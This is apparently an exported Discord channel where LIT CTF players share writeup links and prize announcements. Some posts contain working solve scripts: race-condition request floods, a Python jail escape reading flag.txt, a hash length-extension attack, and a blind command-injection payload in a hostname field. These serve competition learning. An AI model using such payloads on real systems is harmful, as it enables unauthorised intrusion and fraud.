+      <div class="content">for rev/rick decompile the software with any decompiler of your choosing (i used decompiler explorer <a href="https://dogbolt.org/)" target="_blank">https://dogbolt.org/)</a> and search for `main` or `wat is flag` or `ur wrong` and notice that there is a suspicious string (in binary ninja) that looks like a flag for a variable then used in the if statement. then check the original compiled code in a general editor. there are curly start and end brackets, and it appears to be in the reverse order. if you reverse it (i used python with "flag"[::-1] to reverse it quickly), you can see the flag</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T08:28:35.219000+00:00</span>
+      <div class="content">misc/Blank and Empty -&gt; &lt;<a href="https://www.dcode.fr/whitespace-language&gt;" target="_blank">https://www.dcode.fr/whitespace-language&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T06:33:59.994000+00:00</span>
+      <div class="content"><a href="https://farmansk.github.io/posts/litctf2023/" target="_blank">https://farmansk.github.io/posts/litctf2023/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:47:47.939000+00:00</span>
+      <div class="content">```JS
+const requests = [];
+const url = "<a href="http://34.130.180.82:57434/";" target="_blank">http://34.130.180.82:57434/";</a>
+
+// Function to make a donate request
+async function donate(amount) {
+  const requestPromise = fetch(url + "api/donate", {
+    headers: {
+      accept: "*/*",
+      "accept-language": "en-US,en;q=0.9",
+      "content-type": "application/json",
+      prefer: "safe",
+    },
+    referrer: url + "donate.html",
+    referrerPolicy: "strict-origin-when-cross-origin",
+    body: JSON.stringify({ fund: "codetigerorz", amount: amount }),
+    method: "POST",
+    mode: "cors",
+    credentials: "omit",
+  });
+  return requestPromise;
+}
+
+// Use async/await with Promise.all to send requests concurrently
+async function sendRequests() {
+  const firstSetPromises = Array.from({ length: 5 }, () =&gt; donate("90071992547409.91"));
+  const secondSetPromises = Array.from({ length: 1 }, () =&gt; donate("1048576.09"));
+
+  const allPromises = [...firstSetPromises, ...secondSetPromises];
+
+  try {
+    const responses = await Promise.all(allPromises);
+    console.log(responses);
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+// Call the function to send requests concurrently
+sendRequests();
+
+// Fetch the balance as before
+fetch(url + "api/balance", {
+  headers: {
+    accept:
+      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "max-age=0",
+    "sec-gpc": "1",
+    "upgrade-insecure-requests": "1",
+  },
+  referrerPolicy: "strict-origin-when-cross-origin",
+  body: null,
+  method: "GET",
+  mode: "cors",
+  credentials: "omit",
+})
+  .then((response) =&gt; response.text())
+  .then((text) =&gt; console.log(text))
+  .catch((error) =&gt; console.error(error));
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:47:07.642000+00:00</span>
+      <div class="content">veri wonky script below: 💀 
+```py
+import asyncio
+from aiohttp import ClientSession
+
+
+async def fetch(url, session):
+    async with session.post(
+        url, json={"amount": "90071992547409.91", "fund": "codetigerorz"}
+    ) as response:
+        return await response.text()
+
+
+async def bound_fetch(sem, url, session):
+    async with sem:
+        await fetch(url, session)
+
+
+async def run(r):
+    url = "<a href="http://34.130.180.82:57344/api/donate"" target="_blank">http://34.130.180.82:57344/api/donate"</a>
+
+    tasks = []
+
+    sem = asyncio.Semaphore(1000)
+
+    async with ClientSession() as session:
+        for i in range(r):
+            task = asyncio.ensure_future(bound_fetch(sem, url, session))
+            tasks.append(task)
+
+        responses = asyncio.gather(*tasks)
+        await responses
+
+
+number = 50
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:45:28.514000+00:00</span>
+      <div class="content">```py
+import grequests
+
+path = '<a href="http://34.130.180.82:53840'" target="_blank">http://34.130.180.82:53840'</a> # replace
+
+a = [grequests.post(path + '/api/donate', json={'fund': 'codetigerorz', 'amount': 90071992547409.91}) for _ in range(50)]
+print(a)
+print(grequests.map(a))
+```
+then go to the site, you should magically have 50 cents</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:44:07.944000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/typing-fast-gif-25577869" target="_blank">https://tenor.com/view/typing-fast-gif-25577869</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:22:28.671000+00:00</span>
+      <div class="content">**obligatory-pyjail:**
+<a href="https://github.com/python/cpython/blob/3.10/Modules/_posixsubprocess.c#L726" target="_blank">https://github.com/python/cpython/blob/3.10/Modules/_posixsubprocess.c#L726</a>
+<a href="https://github.com/python/cpython/blob/3.10/Lib/subprocess.py#L1796" target="_blank">https://github.com/python/cpython/blob/3.10/Lib/subprocess.py#L1796</a>
+```py
+__import__("_posixsubprocess").fork_exec(['cat', 'flag.txt'], (b'/bin/cat',), True, (7,), None, None, -1, -1, __import__("os").pipe()[0], 5, -1, -1, __import__("os").pipe()[0], 7, True, False, None, None, None, -1, None)+print(__import__("os").read(4, 1000).decode())
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:18:46.548000+00:00</span>
+      <div class="content">actual lll reduction
+only heard of this from <a href="https://docs.google.com/document/d/1stTJAjLmCXtqctdFOpuv4lylegcmfO8mFrptFtwqb78/edit" target="_blank">https://docs.google.com/document/d/1stTJAjLmCXtqctdFOpuv4lylegcmfO8mFrptFtwqb78/edit</a> lol nice</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:13:09.951000+00:00</span>
+      <div class="content">Leaderboard-service
+```py
+import requests
+import hlextend
+from Crypto.Util.number import *
+from tqdm import tqdm
+
+given = bytes.fromhex("52f390327e474539272454557b543f2d4980214072321d49df4be364a330c7")
+
+for i in tqdm(range(256)):
+    full_hash = (long_to_bytes(i) + given).hex()
+    sha = hlextend.new("sha256")
+    add = "0000000000000000000000000000000a" + sha.extend(b'lmao', b'', 16, full_hash).hex()
+    new_hash = sha.hexdigest()
+
+    url = "<a href="http://litctf.org:31773/getf?table=flag_table&amp;hash="" target="_blank">http://litctf.org:31773/getf?table=flag_table&amp;hash="</a> + new_hash + "&amp;id=" + add
+    rep = requests.get(url)
+    if "ERR" not in rep.text:
+        print(url)```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:11:38.035000+00:00</span>
+      <div class="content">```py
+import requests
+import time
+import string
+
+charset = string.ascii_letters + string.digits + "_{}?!"
+url = "<a href="http://34.130.180.82:55922/"" target="_blank">http://34.130.180.82:55922/"</a>
+flag = "LITCTF{"
+
+while True:
+    print(flag)
+    for c in charset:
+        payload = f'a ; cat flag.txt | grep "{flag + c}" &amp;&amp; sleep 1'
+
+        start = time.time()
+
+        res = requests.post(url, data={"hostname": payload})
+
+        end = time.time()
+
+        if end - start &gt; 1:
+            flag += c
+            break
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2023-08-08T04:03:55.436000+00:00</span>
+      <div class="content">**WE HAVE A WRITEUP CONTEST WITH $200 CASH PRIZES **. Some details:
+- Post your writeup &lt;#866529872737075221&gt; and submit a response at <a href="https://forms.gle/gqX6fvB1NWMcT82V6" target="_blank">https://forms.gle/gqX6fvB1NWMcT82V6</a>  to each problem. (We do not do judge compilations, only individual challenges)
+- The deadline is **August 15th** for submitting to the form.
+- We will pick the most LIT writeup for each category 😻</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T04:47:27.408000+00:00</span>
+      <div class="content"><a href="https://lit.lhsmathcs.org/results2022" target="_blank">https://lit.lhsmathcs.org/results2022</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T04:18:03.294000+00:00</span>
+      <div class="content">&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/CTF.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/CTF.md&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T04:15:04.996000+00:00</span>
+      <div class="content">```
+#105 <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md</a>
+(misc/HelloWorld)
+Pros:
+- funny
+Cons:
+- this chal doesn't need a writeup
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T04:08:04.112000+00:00</span>
+      <div class="content">Misc HM:
+- &lt;@503148135892254721&gt; <a href="https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/misc/Geoguessr%20Normal%20Mode" target="_blank">https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/misc/Geoguessr%20Normal%20Mode</a>
+- &lt;@524271486333222923&gt; <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T04:01:33.787000+00:00</span>
+      <div class="content">Pwn HM:
+- &lt;@286214226031411201&gt; <a href="https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28" target="_blank">https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28</a>
+- &lt;@299360315970158595&gt; <a href="https://github.com/jdabtieu/litctf-2022-return/blob/main/pwn-writer.md" target="_blank">https://github.com/jdabtieu/litctf-2022-return/blob/main/pwn-writer.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T03:51:36.486000+00:00</span>
+      <div class="content">Here are the Honorable mentions
+Web HM:
+- &lt;@622211834392608800&gt;  <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Secure%20Website.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Secure%20Website.md</a>
+- &lt;@299360315970158595&gt;  <a href="https://github.com/jdabtieu/litctf-2022-return/blob/main/web-FlushedEmoji.md" target="_blank">https://github.com/jdabtieu/litctf-2022-return/blob/main/web-FlushedEmoji.md</a>
+- &lt;@305097843096551435&gt; <a href="https://hackmd.io/@dianalin2/Sy5i3jhhq" target="_blank">https://hackmd.io/@dianalin2/Sy5i3jhhq</a>
+- &lt;@447295125178023938&gt;  <a href="https://mtiennnnn.github.io/mtiennnnn//blog/litctf2022/" target="_blank">https://mtiennnnn.github.io/mtiennnnn//blog/litctf2022/</a>
+
+Crypto HM:
+- &lt;@585886739885719562&gt;  <a href="https://hackmd.io/_N4PhkHvTH-lR6ruaY9wAQ?both" target="_blank">https://hackmd.io/_N4PhkHvTH-lR6ruaY9wAQ?both</a>
+- &lt;@524271486333222923&gt; <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Flashy%20Colors.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Flashy%20Colors.md</a>
+
+Rev HM:
+- lodsb <a href="https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/rev/math%20test" target="_blank">https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/rev/math%20test</a>
+- &lt;@622211834392608800&gt;  <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/minimalist.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/minimalist.md</a>
+
+Pwn HW:
+- &lt;@286214226031411201&gt; <a href="https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28" target="_blank">https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28</a>
+- &lt;@299360315970158595&gt; <a href="https://github.com/jdabtieu/litctf-2022-return/blob/main/pwn-writer.md" target="_blank">https://github.com/jdabtieu/litctf-2022-return/blob/main/pwn-writer.md</a>
+
+Misc HM:
+- &lt;@503148135892254721&gt; <a href="https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/misc/Geoguessr%20Normal%20Mode" target="_blank">https://github.com/ksaweryr/ctf-writeups/tree/master/2022/lit/misc/Geoguessr%20Normal%20Mode</a>
+- &lt;@524271486333222923&gt; <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md</a>
+
+Yall did an incredible job at writing writeups 🔥, and made it to the final selection round &lt;:goodjob:743848931133489185&gt;!</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-05T03:35:39.085000+00:00</span>
+      <div class="content">Congratulations to the following winners in each category!
+
+**Crypto**: Misery Straightener by &lt;@585886739885719562&gt;  <a href="https://hackmd.io/nHC4BN66QgGUMfS3MaKLtg?view" target="_blank">https://hackmd.io/nHC4BN66QgGUMfS3MaKLtg?view</a>
+**Misc**: Rythm's Double Identity by &lt;@311324287086624768&gt; <a href="https://maxniederman.com/posts/ctf/lit-2022/rythm/" target="_blank">https://maxniederman.com/posts/ctf/lit-2022/rythm/</a>
+**Pwn**: House of Cockarocha by &lt;@863974490879164466&gt;  <a href="https://piers-n.github.io/post/lit-ctf-2022-writeup/" target="_blank">https://piers-n.github.io/post/lit-ctf-2022-writeup/</a>
+**Rev**: You Know The Rules And So Do I by &lt;@111834400383070208&gt; <a href="https://sahuang.github.io/writeups/litctf-2022/" target="_blank">https://sahuang.github.io/writeups/litctf-2022/</a>
+**Web**: Imgurbage by &lt;@268047533698318337&gt;  <a href="https://github.com/zazolcgeslajazn/writeups/blob/main/LITCTF-2022/web/imgurbage.md" target="_blank">https://github.com/zazolcgeslajazn/writeups/blob/main/LITCTF-2022/web/imgurbage.md</a>
+
+Please DM me your paypal information to receive **$40 in cash** as your prize!</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-03T03:37:01.592000+00:00</span>
+      <div class="content"><a href="https://docs.google.com/document/d/1gflqzgFlGbMR2gxFGVb3NMiesYm1YCl9eVml1M90Hdw/edit" target="_blank">https://docs.google.com/document/d/1gflqzgFlGbMR2gxFGVb3NMiesYm1YCl9eVml1M90Hdw/edit</a> hm im not sure if im allowed to share writeup (DM me if you want me to take it down), but also 😱 what is this approach</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-02T15:24:48.954000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/writeup/34773" target="_blank">https://ctftime.org/writeup/34773</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-02T04:21:27.287000+00:00</span>
+      <div class="content"><a href="https://cdn.discordapp.com/emojis/896228086364901386.webp?size=48&amp;quality=lossless" target="_blank">https://cdn.discordapp.com/emojis/896228086364901386.webp?size=48&amp;quality=lossless</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-02T01:57:07.377000+00:00</span>
+      <div class="content">nice &lt;<a href="https://github.com/github/markup/issues/1153&gt;" target="_blank">https://github.com/github/markup/issues/1153&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-02T01:32:10.529000+00:00</span>
+      <div class="content">&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/save_tyger.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/save_tyger.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/save_tyger2.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/save_tyger2.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/waifu.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/pwn/waifu.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/addition.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/addition.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/codetiger-orz.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/codetiger-orz.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/math%20test.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/math%20test.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/minimalist.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/minimalist.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/not%20assembly.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/rev/not%20assembly.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Among%20Us.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Among%20Us.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Amy%20The%20Hedgehog.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Amy%20The%20Hedgehog.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/CTF.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/CTF.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/EYANGCH%20Fan%20Art%20Maker%202.0.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/EYANGCH%20Fan%20Art%20Maker%202.0.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/EYANGCH%20Fan%20Art%20Maker.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/EYANGCH%20Fan%20Art%20Maker.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Flushed%20Emoji.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Flushed%20Emoji.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Guess%20The%20Pokemon.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Guess%20The%20Pokemon.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Kevin's%20Cookies.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Kevin's%20Cookies.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Personal%20Website.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Personal%20Website.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Secure%20Website.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/web/Secure%20Website.md&gt;</a>
+repo: <a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-02T01:32:08.224000+00:00</span>
+      <div class="content">behold, 36 writeups! (written by me and my team)
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/A%20ROCk.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/A%20ROCk.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Flashy%20Colors.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Flashy%20Colors.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Running%20Up%20That%20Hill.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/crypto/Running%20Up%20That%20Hill.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/CodeTiger%20orz%20Is%20Meta.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/CodeTiger%20orz%20Is%20Meta.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Discord%20Flag.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Discord%20Flag.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Hard%20Mode.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Hard%20Mode.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Normal%20Mode.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Normal%20Mode.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Warm-up.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Geoguessr%20Warm-up.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/HelloWorld.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Hex%20to%20ASCII.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Hex%20to%20ASCII.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Intro%20to%20LITCTF.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Intro%20to%20LITCTF.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/MURDER%20MYSTERY.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/MURDER%20MYSTERY.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/PeanutButter.jar.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/PeanutButter.jar.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Rythm's%20Double%20Identity.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Rythm's%20Double%20Identity.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Survey.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Survey.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Trash%20Royale.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/Trash%20Royale.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/We're%20no%20stranger%20to%20love.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/We're%20no%20stranger%20to%20love.md&gt;</a>
+&lt;<a href="https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/kirby!!!.md&gt;" target="_blank">https://github.com/EmeraldBlock/LIT-CTF-2022-writeups/blob/main/misc/kirby!!!.md&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-01T21:31:29.562000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/writeup/34769" target="_blank">https://ctftime.org/writeup/34769</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-01T06:12:55.560000+00:00</span>
+      <div class="content"><a href="https://maxniederman.com/posts/ctf/lit-2022/rythm/" target="_blank">https://maxniederman.com/posts/ctf/lit-2022/rythm/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-01T04:19:06.331000+00:00</span>
+      <div class="content">&lt;<a href="https://discord.com/channels/738848412912451695/860282839492722688/1000275187540963328&gt;" target="_blank">https://discord.com/channels/738848412912451695/860282839492722688/1000275187540963328&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-08-01T03:19:27.227000+00:00</span>
+      <div class="content"><a href="https://github.com/jdabtieu/litctf-2022-return" target="_blank">https://github.com/jdabtieu/litctf-2022-return</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-29T23:11:07.635000+00:00</span>
+      <div class="content">writeup for writer: <a href="https://freudians.github.io/2022/07/25/writer-LITCTF.html" target="_blank">https://freudians.github.io/2022/07/25/writer-LITCTF.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-29T01:12:06.762000+00:00</span>
+      <div class="content"><a href="https://chrome.google.com/webstore/detail/tabs-cache-and-management/ecgfkcddifhjofkeagepcffjakglmoog?hl=en" target="_blank">https://chrome.google.com/webstore/detail/tabs-cache-and-management/ecgfkcddifhjofkeagepcffjakglmoog?hl=en</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-28T16:48:28.525000+00:00</span>
+      <div class="content">As there is no wp for misery, I make a simple one ... <a href="https://hackmd.io/nHC4BN66QgGUMfS3MaKLtg?view" target="_blank">https://hackmd.io/nHC4BN66QgGUMfS3MaKLtg?view</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-28T10:33:52.036000+00:00</span>
+      <div class="content">my writeup for house of cockarocha: <a href="https://piers-n.github.io/post/lit-ctf-2022-writeup/" target="_blank">https://piers-n.github.io/post/lit-ctf-2022-writeup/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-27T20:07:27.343000+00:00</span>
+      <div class="content">My wp for RSA: <a href="https://hackmd.io/_N4PhkHvTH-lR6ruaY9wAQ?both" target="_blank">https://hackmd.io/_N4PhkHvTH-lR6ruaY9wAQ?both</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-27T16:28:11.798000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/team/189300" target="_blank">https://ctftime.org/team/189300</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-27T16:23:20.111000+00:00</span>
+      <div class="content"><a href="https://ctftime.org/team/195167" target="_blank">https://ctftime.org/team/195167</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T18:03:23.587000+00:00</span>
+      <div class="content">imgurbage - <a href="https://github.com/zazolcgeslajazn/writeups/blob/main/LITCTF-2022/web/imgurbage.md" target="_blank">https://github.com/zazolcgeslajazn/writeups/blob/main/LITCTF-2022/web/imgurbage.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T17:52:38.757000+00:00</span>
+      <div class="content">reader writeup - <a href="https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28" target="_blank">https://medium.com/@shenhavmor/reader-lit-2022-ctf-writeup-651db6427b28</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T17:15:57.421000+00:00</span>
+      <div class="content"><a href="https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/blob/main/flashy_colors/README.md" target="_blank">https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/blob/main/flashy_colors/README.md</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T17:01:19.564000+00:00</span>
+      <div class="content">save_tyger2 writeup (also in ctftime) <a href="https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/tree/main/save_tyger2" target="_blank">https://github.com/CTF-Team-PlusPlusC/LITCTF2022-Writeups/tree/main/save_tyger2</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T14:32:39.100000+00:00</span>
+      <div class="content">Well I made a writeup for save_tyger
+<a href="https://ctftime.org/writeup/34652" target="_blank">https://ctftime.org/writeup/34652</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T13:21:50.725000+00:00</span>
+      <div class="content"><a href="https://docs.google.com/document/d/1z-oP3tp9sf9imX5xjUsn4Qw3KDKp2wQVYBqSvIh8_2A/edit" target="_blank">https://docs.google.com/document/d/1z-oP3tp9sf9imX5xjUsn4Qw3KDKp2wQVYBqSvIh8_2A/edit</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T04:15:44.214000+00:00</span>
+      <div class="content"><a href="https://sahuang.github.io/writeups/litctf-2022/" target="_blank">https://sahuang.github.io/writeups/litctf-2022/</a> Writeup for rev/You Know The Rules</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-26T04:05:21.126000+00:00</span>
